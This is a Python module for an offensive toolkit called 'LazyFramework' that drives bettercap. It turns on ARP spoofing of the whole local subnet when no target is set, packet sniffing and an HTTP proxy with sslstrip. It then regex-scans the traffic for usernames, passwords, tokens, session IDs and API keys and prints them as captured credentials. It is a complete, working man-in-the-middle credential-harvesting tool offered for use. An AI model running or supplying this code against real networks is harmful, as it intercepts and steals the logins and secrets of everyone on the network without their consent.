#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bettercap Integration Module for LazyFramework
With Auto Target Discovery - Fix "could not find spoof targets"
"""

import subprocess
import re
import threading
import time
import os
import signal
import select
from typing import Dict, Any, Optional, List, Tuple

# ============================================================
# MODULE METADATA
# ============================================================

MODULE_INFO = {
    "name": "bettercap",
    "description": "Bettercap - MITM, ARP Spoofing, Packet Sniffing, Credential Capture",
    "author": "LazyFramework Team",
    "platform": "linux",
    "rank": "excellent",
    "license": "MIT",
    "dependencies": [],
    "references": [
        "https://www.bettercap.org/",
        "https://github.com/bettercap/bettercap",
    ],
}

# ============================================================
# MODULE OPTIONS
# ============================================================

OPTIONS = {
    "INTERFACE": {
        "description": "Network interface to use (e.g., eth0, wlan0)",
        "required": True,
        "default": "",
    },
    "TARGET": {
        "description": "Target IP (empty = auto-discover all hosts)",
        "required": False,
        "default": "",
    },
    "MODE": {
        "description": "Operation mode",
        "required": False,
        "default": "auto",
        "choices": ["interactive", "auto"],
    },
    "ACTION": {
        "description": "Action to perform",
        "required": False,
        "default": "arp-sniff",
        "choices": ["scan", "arp", "sniff", "arp-sniff", "all"],
    },
    "SNIFFER": {
        "description": "Enable packet sniffer",
        "required": False,
        "default": "true",
        "choices": ["true", "false"],
    },
    "ARP_SPOOF": {
        "description": "Enable ARP spoofing",
        "required": False,
        "default": "true",
        "choices": ["true", "false"],
    },
    "HTTP_PROXY": {
        "description": "Enable HTTP proxy",
        "required": False,
        "default": "true",
        "choices": ["true", "false"],
    },
    "HTTPS_PROXY": {
        "description": "Enable HTTPS proxy",
        "required": False,
        "default": "false",
        "choices": ["true", "false"],
    },
    "DISCOVERY": {
        "description": "Enable network discovery (net.probe)",
        "required": False,
        "default": "true",
        "choices": ["true", "false"],
    },
}

# ============================================================
# GLOBAL STATE
# ============================================================

_process = None
_running = False
_stop_event = threading.Event()
_output_buffer = []
_lock = threading.Lock()
_discovered_hosts = {}
_captured_creds = []

# ============================================================
# HELPER FUNCTIONS
# ============================================================


def _check_bettercap() -> Tuple[bool, str]:
    try:
        result = subprocess.run(
            ["bettercap", "-version"], capture_output=True, text=True, timeout=3
        )
        return (result.returncode == 0, result.stdout.strip() or "unknown")
    except:
        return False, "not found"


def _check_interface(interface: str) -> bool:
    try:
        result = subprocess.run(
            ["ip", "link", "show", interface], capture_output=True, text=True
        )
        return result.returncode == 0
    except:
        return False


def _get_gateway() -> Optional[str]:
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"], capture_output=True, text=True
        )
        match = re.search(r"default via\s+(\d+\.\d+\.\d+\.\d+)", result.stdout)
        return match.group(1) if match else None
    except:
        return None


def _is_root() -> bool:
    return os.geteuid() == 0 if hasattr(os, "geteuid") else False


def _get_network_range(interface: str) -> str:
    """Get network range from interface"""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", interface], capture_output=True, text=True
        )
        match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", result.stdout)
        if match:
            ip = match.group(1)
            prefix = int(match.group(2))
            ip_parts = ip.split(".")
            if prefix >= 24:
                return f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/{prefix}"
            elif prefix >= 16:
                return f"{ip_parts[0]}.{ip_parts[1]}.0.0/{prefix}"
            else:
                return f"{ip_parts[0]}.0.0.0/{prefix}"
    except:
        pass
    return "192.168.1.0/24"


# ============================================================
# CREDENTIAL DETECTION
# ============================================================


def _process_output(line: str):
    global _output_buffer, _discovered_hosts, _captured_creds

    if not line or not line.strip():
        return

    with _lock:
        _output_buffer.append(line)
        if len(_output_buffer) > 3000:
            _output_buffer = _output_buffer[-1500:]

    original_line = line
    line_lower = line.lower()

    # ---- Host Discovery ----
    if "endpoint.new" in line_lower:
        ip_match = re.search(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line)
        if ip_match:
            ip = ip_match.group(1)
            if ip not in _discovered_hosts and not ip.startswith(("0.0.0.", "127.")):
                _discovered_hosts[ip] = {"first_seen": time.strftime("%H:%M:%S")}
                print(f"[+] Host discovered: {ip}")

    # ---- ARP Spoof Status ----
    if "arp.spoof" in line_lower:
        if "could not find spoof targets" in line_lower:
            print("[!] No targets found. Running discovery...")

    # ---- Credential Patterns ----
    cred_patterns = [
        (
            r'(?:username|user|email|login|uname)[\s"=:\?\&]*([^\s&"\'<]{3,})',
            "username",
        ),
        (
            r'(?:password|pass|passwd|pwd|secret)[\s"=:\?\&]*([^\s&"\'<]{3,})',
            "password",
        ),
        (r'"(?:username|user|email)"\s*:\s*["\']([^"\']+)', "username"),
        (r'"(?:password|pass|pwd)"\s*:\s*["\']([^"\']+)', "password"),
        (r'(?:token|jwt|auth|sessionid)[\s"=:\?\&]*([A-Za-z0-9_\-\.]{10,})', "token"),
        (r'(?:api_key|apikey)[\s"=:\?\&]*([A-Za-z0-9_\-\.]{15,})', "api_key"),
    ]

    for pattern, cred_type in cred_patterns:
        matches = re.findall(pattern, original_line, re.IGNORECASE)
        for match in matches:
            match_str = str(match).strip()
            if len(match_str) >= 3:
                cred = {
                    "type": cred_type,
                    "value": match_str,
                    "time": time.strftime("%H:%M:%S"),
                    "method": "GET" if "GET" in original_line else "POST",
                    "source": (
                        original_line[:160] + "..."
                        if len(original_line) > 160
                        else original_line
                    ),
                }
                if not any(
                    c["value"] == match_str and c["type"] == cred_type
                    for c in _captured_creds[-50:]
                ):
                    _captured_creds.append(cred)
                    print(f"\n🔥 [CREDENTIAL] [{cred_type.upper()}] → {match_str}")
                    print(f"    Source: {cred['source']}\n")


# ============================================================
# BETTERCAP COMMAND BUILDER - FIXED AUTO TARGET
# ============================================================


def _build_auto_command(options: Dict[str, Any]) -> List[str]:
    cmd = ["bettercap", "-iface", options.get("INTERFACE", "eth0")]
    eval_commands = []

    # ---- Discovery (net.probe) ----
    if str(options.get("DISCOVERY", "true")).lower() == "true":
        eval_commands.append("net.probe on")
        eval_commands.append("set net.probe.timeout 2")

    # ---- ARP Spoofing ----
    if str(options.get("ARP_SPOOF", "true")).lower() == "true":
        eval_commands.extend(
            [
                "arp.spoof on",
                "set arp.spoof.internal true",
                "set arp.spoof.fullduplex true",
            ]
        )

        target = options.get("TARGET", "").strip()
        if target:
            eval_commands.append(f"set arp.spoof.targets {target}")
        else:
            # Auto-discovery: spoof all hosts in network
            interface = options.get("INTERFACE", "")
            network = _get_network_range(interface)
            eval_commands.append(f"set arp.spoof.targets {network}")
            print(f"[*] Auto-target: {network}")

    # ---- Sniffer ----
    if str(options.get("SNIFFER", "true")).lower() == "true":
        eval_commands.extend(["net.sniff on", "set net.sniff.local true"])

    # ---- HTTP/HTTPS Proxy ----
    if str(options.get("HTTP_PROXY", "true")).lower() == "true":
        eval_commands.extend(["http.proxy on", "set http.proxy.sslstrip true"])

    if str(options.get("HTTPS_PROXY", "false")).lower() == "true":
        eval_commands.append("https.proxy on")

    if eval_commands:
        cmd.extend(["-eval", "; ".join(eval_commands)])

    return cmd


# ============================================================
# STOP FUNCTION
# ============================================================


def stop():
    global _running, _process
    _stop_event.set()
    if _process:
        try:
            if hasattr(os, "killpg"):
                os.killpg(os.getpgid(_process.pid), signal.SIGINT)
            else:
                _process.terminate()
            _process.wait(timeout=3)
        except:
            try:
                _process.kill()
            except:
                pass
    _running = False
    print("\n[*] Bettercap stopped.")
    print(f"[*] Discovered hosts : {len(_discovered_hosts)}")
    print(f"[*] Captured credentials : {len(_captured_creds)}")


# ============================================================
# MAIN RUN
# ============================================================


def run(session: Dict[str, Any], options: Dict[str, Any] = None) -> str:
    global _running, _discovered_hosts, _captured_creds, _process

    _discovered_hosts.clear()
    _captured_creds.clear()
    _stop_event.clear()

    if options is None:
        options = {}

    print("=" * 85)
    print("          BETTERCAP - MITM + CREDENTIAL SNIFFER")
    print("=" * 85)

    if not _check_bettercap()[0]:
        print("[!] Bettercap not installed!")
        return "Bettercap not found"

    if not _is_root():
        print("[!] Warning: Not running as root!")
        print("[*] Run with: sudo python3 gui.py")

    final_options = {**options, **session}
    interface = final_options.get("INTERFACE", "eth0")

    if not _check_interface(interface):
        print(f"[!] Interface {interface} not found!")
        return "Interface not found"

    # Get network info
    gateway = _get_gateway()
    if gateway:
        print(f"[*] Gateway: {gateway}")

    network = _get_network_range(interface)
    print(f"[*] Network: {network}")

    cmd = _build_auto_command(final_options)
    print(f"[*] Starting Bettercap on {interface}...")
    print(f"[*] Command: {' '.join(cmd)}")
    print("-" * 85)

    try:
        _process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            preexec_fn=os.setsid if hasattr(os, "setsid") else None,
        )

        _running = True

        while _running and not _stop_event.is_set():
            if _process.poll() is not None:
                break

            try:
                rlist, _, _ = select.select([_process.stdout], [], [], 0.5)
                if rlist:
                    line = _process.stdout.readline()
                    if line:
                        _process_output(line.rstrip())
                    else:
                        break
                else:
                    time.sleep(0.05)
            except:
                break

    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        stop()

    return "Bettercap execution completed."


# ============================================================
# HELPER
# ============================================================


def get_discovered_hosts():
    return _discovered_hosts.copy()


def get_captured_creds():
    return _captured_creds.copy()
